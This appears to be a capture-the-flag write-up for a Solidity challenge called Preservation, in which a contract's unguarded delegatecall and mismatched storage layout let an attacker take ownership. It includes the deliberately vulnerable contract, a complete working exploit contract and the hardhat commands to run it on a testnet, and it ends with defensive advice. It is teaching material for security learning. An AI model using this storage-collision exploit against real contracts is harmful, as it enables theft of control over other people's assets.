# Level 16: Preservation Challenge

## Challenge Description

This challenge involves exploiting a smart contract called Preservation that uses delegatecall to execute functionality from other contracts. The goal is to take ownership of the contract by understanding and exploiting the vulnerabilities associated with delegatecall.

## Contract Location

The challenge contract is located at:
```
/contracts/level-16-preservation/Preservation.sol
```

## Understanding the Challenge

The `Preservation` contract uses two library contracts to set time values. It makes use of `delegatecall` to execute the `setTime` function from these libraries:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

### Key Observations

1. The Preservation contract has three state variables before `storedTime`: `timeZone1Library`, `timeZone2Library`, and `owner`.
2. The LibraryContract has only one state variable: `storedTime`.
3. When using `delegatecall`, the called contract's code is executed in the context of the calling contract, which means it uses the calling contract's storage layout.
4. The Preservation contract calls the `setTime` function via `delegatecall`, which modifies the `storedTime` variable in the LibraryContract. However, due to the storage layout mismatch, it will actually modify the first state variable in the Preservation contract, which is `timeZone1Library`.

## Winning Strategy

The vulnerability lies in the storage layout mismatch between the Preservation and LibraryContract contracts. When using `delegatecall`, the storage slots are shared but the variable names are not. 

We can exploit this in two steps:
1. First, create a malicious library contract with the same storage layout as the Preservation contract.
2. Then, call `setFirstTime` with our malicious contract's address cast to uint256, which will replace the `timeZone1Library` address.
3. Finally, call `setFirstTime` again, which will now delegatecall our malicious contract, where we can modify the owner variable.

## Hint for Thinking

Ask yourself:
* What happens when you delegate call to a contract with a different storage layout?
* Which storage slot gets modified in the Preservation contract when the LibraryContract's `setTime` is executed via delegatecall?
* How can you leverage this to change the owner of the Preservation contract?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### Understanding the Vulnerability

The key vulnerability in the Preservation contract is related to how `delegatecall` works in Ethereum. When Contract A executes a `delegatecall` to a function in Contract B, the function in Contract B is executed with Contract A's storage, msg.sender, and msg.value.

In this case:
1. The Preservation contract has this storage layout:
   - slot 0: `timeZone1Library` (address)
   - slot 1: `timeZone2Library` (address)
   - slot 2: `owner` (address)
   - slot 3: `storedTime` (uint256)

2. But the LibraryContract has this storage layout:
   - slot 0: `storedTime` (uint256)

3. When the Preservation contract does a `delegatecall` to the LibraryContract's `setTime` function, the function tries to modify `storedTime` which is at slot 0 in the LibraryContract. However, since the function runs in the context of the Preservation contract, it will modify the variable at slot 0 in the Preservation contract, which is `timeZone1Library`.

### Exploit Steps

1. **Deploy a Malicious Library**: Create a contract that has the same storage layout as the Preservation contract. This ensures that when we modify variables, they target the correct slots:
   ```solidity
   contract MaliciousLibrary {
       // Match storage layout of Preservation
       address public timeZone1Library;
       address public timeZone2Library;
       address public owner;
       uint256 storedTime;
       
       function setTime(uint256 _time) public {
           // When called via delegatecall, this will modify the owner variable
           owner = address(uint160(_time));
       }
   }
   ```

2. **Replace the Library Address**: Call `setFirstTime` with the address of our malicious library converted to uint256. This replaces the `timeZone1Library` address with our malicious library:
   ```solidity
   preservation.setFirstTime(uint256(uint160(address(maliciousLibrary))));
   ```

3. **Take Ownership**: Call `setFirstTime` again. Now that the `timeZone1Library` is our malicious contract, this call will delegatecall our malicious `setTime` function, which will set the owner to our desired address:
   ```solidity
   preservation.setFirstTime(uint256(uint160(address(this))));
   ```

### Full Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
}

contract MaliciousLibrary {
    // Match storage layout of Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    
    function setTime(uint256 _time) public {
        // When called via delegatecall, this will modify the owner variable
        owner = address(uint160(_time));
    }
}

contract PreservationExploit {
    IPreservation public preservation;
    MaliciousLibrary public maliciousLibrary;
    address public owner;
    
    constructor(address _preservationAddress) {
        preservation = IPreservation(_preservationAddress);
        maliciousLibrary = new MaliciousLibrary();
        owner = msg.sender;
    }
    
    function exploit() external {
        require(msg.sender == owner, "Only owner can execute the exploit");
        
        // Replace the library address with our malicious library
        preservation.setFirstTime(uint256(uint160(address(maliciousLibrary))));
        
        // Now call setFirstTime again to take ownership
        preservation.setFirstTime(uint256(uint160(address(this))));
    }
    
    function checkSuccess() external view returns (bool) {
        return preservation.owner() == address(this);
    }
}
```

### Execution Steps

1. **Deploy the Preservation Contract and Libraries**:
   ```shell
   npx hardhat run scripts/level-16-preservation/deploy-preservation-instance.ts --network sepolia
   ```

2. **Deploy the PreservationExploit Contract**:
   ```shell
   PRESERVATION_INSTANCE_ADDRESS=0xYourPreservationAddress npx hardhat run scripts/level-16-preservation/deploy-preservation-solution.ts --network sepolia
   ```

3. **Execute the Exploit**:
   ```shell
   PRESERVATION_INSTANCE_ADDRESS=0xYourPreservationAddress PRESERVATION_SOLUTION_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-16-preservation/execute-preservation-exploit.ts --network sepolia
   ```

## Key Insights

1. **Storage Layout and Delegatecall**: When using `delegatecall`, the storage layout of both contracts must match exactly to prevent unexpected behaviors. The called contract's code operates on the caller's storage.

2. **Delegatecall Dangers**: `delegatecall` is a powerful but dangerous feature in Ethereum. It allows one contract to execute another contract's code in its own context, which can lead to severe vulnerabilities if not used carefully.

3. **Proxy Pattern Best Practices**: When implementing proxy patterns or using delegatecall for upgradeable contracts, it's crucial to ensure storage layout compatibility and use storage layout techniques like the "unstructured storage pattern" or OpenZeppelin's transparent proxy pattern.

4. **Defense Measures**: To prevent similar vulnerabilities, consider:
   - Using libraries that don't modify state when called via delegatecall
   - Implementing proper access controls for functions that use delegatecall
   - Ensuring storage layout compatibility between contracts
   - Using established proxy patterns and libraries like OpenZeppelin's proxy contracts
